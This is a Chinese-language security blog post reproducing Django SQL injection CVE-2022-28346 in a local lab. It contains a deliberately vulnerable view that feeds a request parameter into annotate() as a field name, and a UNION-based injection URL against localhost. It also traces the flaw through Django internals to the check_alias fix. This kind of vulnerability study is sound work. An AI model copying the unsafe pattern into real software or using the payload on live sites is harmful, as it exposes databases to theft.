#  Django SQL注入漏洞（CVE-2022-28346）   
 蚁景网安   2025-02-13 08:30  
  
## 漏洞简介  
  
Django 在2022年发布的安全更新，修复了在 QuerySet 的 annotate()， aggregate()， extra() 等函数中存在的 SQL 注入漏洞。  
### 影响版本  
  
2.2<= Django Django <2.2.283.2<= Django Django <3.2.134.0<= Django Django <4.0.4  
  
需要使用了 annotate 或者 aggregate 或 extra 方法  
## 环境搭建  
### 搭建特定版本的 django 项目  
  
利用 pycharm 创建一个 python 项目  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfIlL4QxkzSVJOX0fRMGAicicrnstATMBbMJakr06LrWfSQZYKnlLWgqDzmIYCglKWSibfNFe8zGu6iaQ/640?wx_fmt=png "null")  
  
  
创建完成项目后在 Settings 中找到 Project: CVE202228346 对应的 Python Interpreter  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfIlL4QxkzSVJOX0fRMGAicicgap5KKVHYyawgzyVrO3dUCGtx9eSdoKcqR6MmhhDIzcgN1tmK0hAcQ/640?wx_fmt=png "null")  
  
添加存在问题的 Django 版本  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfIlL4QxkzSVJOX0fRMGAicicusZwFjXPibaicxf7nVrt08ZG5VmkLtpcsBsPtic2VwC225O2mDcopr2LQ/640?wx_fmt=png "null")  
  
  
在 Terminal 中执行命令，创建 django 项目  
  
django-admin startproject CVE202228346  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfIlL4QxkzSVJOX0fRMGAicicKNtjZ6TjJGTcCQc0jBNSkr7yvPAdNmEH8YSsVlMCGFVBPB4J6ZibCvA/640?wx_fmt=png "null")  
  
  
配置启动设置  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfIlL4QxkzSVJOX0fRMGAicic4GRJVIQpG13vR2JAmm0LC1BbFHE0oibEh5XHZEkhLCicxugxg4qQEH9Q/640?wx_fmt=png "null")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfIlL4QxkzSVJOX0fRMGAicickRVTH3euqGzrkAibEM2P29Fs86PdKmB4rIEpoOrM2Pcyyp5Jf2aycSA/640?wx_fmt=png "null")  
  
  
运行后就启动了最简单的 django 项目  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfIlL4QxkzSVJOX0fRMGAicicHI8X8dWpsQiaQSiawz5bvgFkcfeuZzP6UpHLEibzVKy96bRndx9ickxjzA/640?wx_fmt=png "null")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfIlL4QxkzSVJOX0fRMGAicic0ibk4Wg5Sxh9X9H8iaQu4LicFNdPJpXiarjC9lUrsSh7rJaDaFVRAGjN0w/640?wx_fmt=png "null")  
  
‍  
### 编写配置漏洞代码  
  
折腾来折腾去，出现了很多问题，一度想要放弃说直接采用 docker ，但是在不断的试错下，最终还是编写成功  
  
因为对 python 的 django 不太熟悉，所以其中可能更多的是比较偏向于基础的操作  
  
‍  
  
进入到项目目录下创建命令 创建第一个应用  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfIlL4QxkzSVJOX0fRMGAicic6jvx5XELUu2BErhPINKibAvhYLtzpia32icB7EakSSiaG5ISFJ4Ll6MqZw/640?wx_fmt=png "null")  
  
  
在 settings.py 中添加配置  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfIlL4QxkzSVJOX0fRMGAicicoOwVd2cvRDbNf25VR0pZhKnGElmXvUticAI6IRU1qyGIyXpk5WLicwxg/640?wx_fmt=png "null")  
  
在 urls.py 中添加 对应的 url，urls.py 相当于路由解析器，将路由解析到对应的 views.py 中对应的函数上  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfIlL4QxkzSVJOX0fRMGAicic90q0pfbpaNllByJP7d5uJJ3Uk0JEJpqYE7eOoyzm424gGV5oFa9jEQ/640?wx_fmt=png "null")  
  
```
urlpatterns = [
    path('admin/', admin.site.urls),
    path('index/',views.index),
    path('demo/',views.users),
    path('initialize/',views.loadexampledata)
]
```  
  
‍  
  
models.py 是创建表结构的时候使用，通过类的定义，可以创建一个表  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfIlL4QxkzSVJOX0fRMGAicicwkZ2u5Cx8ABa2YOqOicgCeet4f9U1zySRG4ugSSZvLLjUamEAfmK8fA/640?wx_fmt=png "null")  
```
from django.db import models

# Create your models here.
class User(models.Model):
    name = models.CharField(max_length=200)

    def __str__(self):
        return self.name
```  
  
‍  
  
views.py 主要定义了对应路由所响应的函数  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfIlL4QxkzSVJOX0fRMGAicicX37IHiaTav1NdGbdIFFdEjkPvaKNnWt7nyCYKwRvaeCJdFjJIG2Ra9w/640?wx_fmt=png "null")  
  
```
from django.db.models import Count
from django.http import HttpResponse
from django.shortcuts import render
from .models import User

# Create your views here.
def index(request):
    return HttpResponse('hello world')

def users(request):
    field = request.GET.get('field', 'name')
    user_amount = User.objects.annotate(**{field: Count("name")})
    html = ""
    for u in user_amount:
        html += "<h3>Amoount of users: {0}</h3>".format(u)
    return HttpResponse(html)

def loadexampledata(request):
    u = User(name="Admin")
    u.save()
    u = User(name="Staff1")
    u.save()
    u = User(name="Staff12")
    u.save()
    return HttpResponse("ok")
```  
  
三个函数分别是 helloword 函数，往数据库中加参数，以及查询数据库中的字段  
  
‍  
  
编写好代码后，需要对数据库执行初始化操作  
```
python manage.py makemigrations
python manage.py migrate
```  
  
‍  
## 漏洞复现  
  
先访问 initialize 为数据库中添加信息  
  
构造 payload  
```
http://127.0.0.1:8000/demo/?field=demo.name" FROM "demo_user" union SELECT "1",sqlite_version(),"3" --
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfIlL4QxkzSVJOX0fRMGAicicV6xg08WiaibvviaPAadRNoRaribuR7TDSlOiakZE8jzo5nXvxVuan96BU1Q/640?wx_fmt=png "null")  
  
## 漏洞分析  
  
发现一个问题，在加上断点调试以后，每次运行输出的结果跟不加断点运行的结果存在很大的差异，结果完全不同。不断尝试之后发现是因为在某些地方加上断点之后，在调试器中查看变量和状态可能会影响程序的执行速度和内存使用情况，为了方便的输出某些位置的变量，采用 print 的方法结合断点调试。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfIlL4QxkzSVJOX0fRMGAicicO36NO70NQE7oUMeqCy2dJo4K3ibLfkTuEOkftRMaClQt6k5ibLibBwbiaQ/640?wx_fmt=png "null")  
  
通过 get 传入的参数 field  
  
CVE202228346.demo.views.users  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfIlL4QxkzSVJOX0fRMGAicicpBKPwy4mibVp5nhH4ic6VwDxr9lqWHAnC3BuLqE3LZOBSMkXk2z3hq3Q/640?wx_fmt=png "null")  
  
此处的**{field: Count("name")} 用来表示拆分字典  
  
跟进 annotate 对传入参数的处理  
  
django.db.models.query.QuerySet.annotate  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfIlL4QxkzSVJOX0fRMGAicicDCu7picI3FyTlr03JL9eaNF8lqOicicE5nqd1Eh6LPEKoiciaqTWcPcsH4g/640?wx_fmt=png "null")  
  
  
继续将参数传入到 _annotate 进行处理  
  
django.db.models.query.QuerySet._annotate  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfIlL4QxkzSVJOX0fRMGAicicE84tnAWWx8TBgK7gubcc9VPWuJ8pb3zQCAY8M1hhg6yreicrXBBUR9w/640?wx_fmt=png "null")  
  
在将 kwargs 的值 update 到 annotations 后，调用 add_annotation 进行处理  
  
django.db.models.sql.query.Query.add_annotation  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfIlL4QxkzSVJOX0fRMGAicicq3cIut3md3R8MwxyibicFZNLhHZCXsBFlYncl9RCBrtNqRiaIUBklxRRA/640?wx_fmt=png "null")  
  
add_annotation  
 也是漏洞存在的关键位置，因为修复漏洞的关键位置也在此处  
  
调用 resolve_expression 解析表达式  
  
django.db.models.aggregates.Aggregate.resolve_expression  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfIlL4QxkzSVJOX0fRMGAicicwsbe5CJn8XY8EpSSvUbpfjVJE3kxHH3OopQ3j7EYr5oXylgGPFM4PQ/640?wx_fmt=png "null")  
  
  
django.db.models.expressions.Func.resolve_expression  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfIlL4QxkzSVJOX0fRMGAicicu89BIUu8icuRuyl8wUjb9zx7mria1fhLtk9jf3PAW4zCPCZY59TAuQ2Q/640?wx_fmt=png "null")  
  
  
django.db.models.expressions.F.resolve_expression  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfIlL4QxkzSVJOX0fRMGAicicRqVwib48icuicFceRnXiag6NGcFILOXm30RbZXTXJ9NsZicgVxBnTxgWmmA/640?wx_fmt=png "null")  
  
  
django.db.models.sql.query.Query.resolve_ref  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfIlL4QxkzSVJOX0fRMGAiciczThbYRpGjNFAQmzdLicC5appJrGjkSj8sAiaxme0FxX0czZ8iapxxEBOA/640?wx_fmt=png "null")  
  
最后我们可以看到 clone 对应的值 以及执行的 SQL 语句  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfIlL4QxkzSVJOX0fRMGAicicSvicpFftsR3A7qQpdxbibVUQZ3872iad6qDg1VoAiaLiaibdPwJmgdhapEhw/640?wx_fmt=png "null")  
  
整个漏洞分析下来，仍然有很多不太清楚的地方，可能再分析几个关于 Django 的漏洞会好一些  
## 漏洞修复  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfIlL4QxkzSVJOX0fRMGAicic6DBD88Libstq04uLqgqZ6CChrMde3CmwIIcWWZe2tBu5t1rcUQlcEZA/640?wx_fmt=png "null")  
  
在 add_annotation  
 添加了 check_alias  
 来对传入的参数进行校验  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC6iavic0tIJIoZCwKvUYnFFiaibgSm6mrFp1ZjAg4ITRicicuLN88YodIuqtF4DcUs9sruBa0bFLtX59lQQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
学习  
网安实战技能课程，戳  
“阅读原文“  
  
